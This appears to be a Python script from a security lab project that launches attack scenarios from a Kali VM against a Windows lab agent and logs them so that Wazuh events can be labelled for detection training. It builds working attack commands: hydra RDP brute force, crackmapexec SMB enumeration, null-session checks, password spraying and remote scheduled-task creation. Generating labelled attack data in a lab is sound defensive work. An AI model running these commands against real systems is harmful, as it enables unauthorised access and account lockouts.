"""
Gerador de cenários de ataque para a VM Kali do laboratório SentryLens.

Corre-se MANUALMENTE na VM Kali (não faz parte do backend/CI) contra o
agente Windows do laboratório, à semelhança dos outros scripts de
automação do laboratório (ver scripts/README.md): não há execução
automática nem testes de integração reais aqui, porque isso implicaria
lançar ataques de facto contra a VM.

Cada cenário lançado escreve uma linha JSON no log de ataques
(default: scripts/attack_log.jsonl), que o feature_extractor.py usa mais
tarde para atribuir o rótulo verdadeiro is_attack aos eventos do Wazuh
por correspondência de timestamp.

Uso:
    python attack_scenarios.py --list
    python attack_scenarios.py --target 192.168.1.20 --scenario brute_force_rdp
    python attack_scenarios.py --target 192.168.1.20 --all
    python attack_scenarios.py --target 192.168.1.20 --scenario lateral_movement_schtasks \
        --user administrator --password "Sup3rS3cret!"
"""

import argparse
import json
import shutil
import subprocess
import sys
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable

DEFAULT_LOG_PATH = Path(__file__).parent / "attack_log.jsonl"


@dataclass
class Scenario:
    name: str
    description: str
    tool: str
    event_ids: list[int]  # Event IDs do event_catalog.py que este cenário tipicamente gera
    build_command: Callable[[argparse.Namespace], list[str] | None]
    # build_command devolve None (em vez de lançar) quando faltam argumentos
    # obrigatórios (ex: credenciais) — o cenário fica "skipped", não crasha.


def _brute_force_rdp_command(args: argparse.Namespace) -> list[str] | None:
    wordlist = args.wordlist or "/usr/share/wordlists/rockyou.txt"
    return ["hydra", "-l", args.user or "administrator", "-P", wordlist, "-t", "4", f"rdp://{args.target}"]


def _smb_enum_command(args: argparse.Namespace) -> list[str] | None:
    return ["crackmapexec", "smb", args.target, "--shares"]


def _blank_password_check_command(args: argparse.Namespace) -> list[str] | None:
    return ["crackmapexec", "smb", args.target, "-u", "", "-p", ""]


def _lateral_movement_schtasks_command(args: argparse.Namespace) -> list[str] | None:
    if not args.user or not args.password:
        return None  # requer credenciais válidas (simula pós-comprometimento)
    return [
        "crackmapexec", "smb", args.target,
        "-u", args.user, "-p", args.password,
        "-X", "schtasks /create /tn SentryLensLab /tr calc.exe /sc once /st 03:14",
    ]


def _account_lockout_spray_command(args: argparse.Namespace) -> list[str] | None:
    return ["crackmapexec", "smb", args.target, "-u", "convidado", "-p", "wrong-password-1234"]


SCENARIOS: dict[str, Scenario] = {
    "brute_force_rdp": Scenario(
        name="brute_force_rdp",
        description="Força bruta de RDP contra o agente alvo (gera 4625 repetidos).",
        tool="hydra",
        event_ids=[4625, 4740],
        build_command=_brute_force_rdp_command,
    ),
    "smb_enum": Scenario(
        name="smb_enum",
        description="Enumeração de partilhas SMB (gera 5140/5145).",
        tool="crackmapexec",
        event_ids=[5140, 5145],
        build_command=_smb_enum_command,
    ),
    "blank_password_check": Scenario(
        name="blank_password_check",
        description="Verificação de sessão nula / password em branco (gera 4797).",
        tool="crackmapexec",
        event_ids=[4797],
        build_command=_blank_password_check_command,
    ),
    "lateral_movement_schtasks": Scenario(
        name="lateral_movement_schtasks",
        description="Pós-comprometimento: cria tarefa agendada via SMB (gera 4672 + 4698).",
        tool="crackmapexec",
        event_ids=[4672, 4698],
        build_command=_lateral_movement_schtasks_command,
    ),
    "account_lockout_spray": Scenario(
        name="account_lockout_spray",
        description="Password spraying com password errada para forçar bloqueio (gera 4625/4740).",
        tool="crackmapexec",
        event_ids=[4625, 4740],
        build_command=_account_lockout_spray_command,
    ),
}


def format_log_entry(
    scenario_name: str,
    target: str,
    tool: str,
    status: str,
    details: dict | None = None,
    now: datetime | None = None,
) -> dict:
    """Constrói a entrada de log (função pura, testável sem lançar ataques)."""
    timestamp = (now or datetime.now(timezone.utc)).isoformat()
    return {
        "timestamp": timestamp,
        "scenario": scenario_name,
        "target": target,
        "tool": tool,
        "status": status,
        "details": details or {},
    }


def append_attack_log(entry: dict, log_path: Path = DEFAULT_LOG_PATH) -> None:
    with open(log_path, "a", encoding="utf-8") as handle:
        handle.write(json.dumps(entry, ensure_ascii=False) + "\n")


def run_scenario(scenario: Scenario, args: argparse.Namespace, log_path: Path = DEFAULT_LOG_PATH) -> dict:
    command = scenario.build_command(args)
    if command is None:
        entry = format_log_entry(scenario.name, args.target, scenario.tool, "skipped",
                                  {"reason": "argumentos obrigatórios em falta (ex: --user/--password)"})
        append_attack_log(entry, log_path)
        return entry

    if shutil.which(command[0]) is None:
        entry = format_log_entry(scenario.name, args.target, scenario.tool, "failed",
                                  {"reason": f"ferramenta '{command[0]}' não encontrada no PATH"})
        append_attack_log(entry, log_path)
        return entry

    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=args.timeout)
        entry = format_log_entry(
            scenario.name, args.target, scenario.tool, "launched",
            {"returncode": result.returncode, "command": " ".join(command)},
        )
    except subprocess.TimeoutExpired:
        entry = format_log_entry(scenario.name, args.target, scenario.tool, "failed",
                                  {"reason": "timeout", "command": " ".join(command)})
    except Exception as exc:
        entry = format_log_entry(scenario.name, args.target, scenario.tool, "failed",
                                  {"reason": str(exc), "command": " ".join(command)})

    append_attack_log(entry, log_path)
    return entry


def _self_check() -> None:
    """Verificação rápida e determinística do formato de log (sem lançar nada)."""
    fixed_time = datetime(2026, 9, 12, 14, 30, 0, tzinfo=timezone.utc)
    entry = format_log_entry("brute_force_rdp", "192.168.1.20", "hydra", "launched", {"returncode": 0}, now=fixed_time)
    assert entry["timestamp"] == "2026-09-12T14:30:00+00:00", entry["timestamp"]
    assert entry["scenario"] == "brute_force_rdp"
    assert set(entry.keys()) == {"timestamp", "scenario", "target", "tool", "status", "details"}
    print("[OK   ] format_log_entry produz o formato JSONL esperado")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--list", action="store_true", help="Lista os cenários disponíveis e sai")
    parser.add_argument("--self-check", action="store_true", help="Corre a verificação interna do formato de log e sai")
    parser.add_argument("--target", help="IP/hostname do agente Windows alvo")
    parser.add_argument("--scenario", choices=sorted(SCENARIOS), help="Nome do cenário a lançar")
    parser.add_argument("--all", action="store_true", help="Lança todos os cenários, em sequência")
    parser.add_argument("--user", help="Utilizador (cenários pós-comprometimento)")
    parser.add_argument("--password", help="Password (cenários pós-comprometimento)")
    parser.add_argument("--wordlist", help="Wordlist para força bruta (default: rockyou.txt)")
    parser.add_argument("--timeout", type=int, default=60, help="Timeout por cenário, em segundos")
    parser.add_argument("--log-path", default=str(DEFAULT_LOG_PATH), help="Caminho do ficheiro de log JSONL")
    args = parser.parse_args()

    if args.self_check:
        _self_check()
        return

    if args.list:
        for scenario in SCENARIOS.values():
            print(f"{scenario.name:28s} [{scenario.tool}] {scenario.description} (Event IDs: {scenario.event_ids})")
        return

    if not args.target:
        parser.error("--target é obrigatório (exceto com --list/--self-check)")

    log_path = Path(args.log_path)
    names = list(SCENARIOS) if args.all else [args.scenario] if args.scenario else []
    if not names:
        parser.error("indica --scenario NOME ou --all")

    for name in names:
        entry = run_scenario(SCENARIOS[name], args, log_path)
        print(f"[{entry['status'].upper():8s}] {name} -> {entry['details']}")


if __name__ == "__main__":
    main()
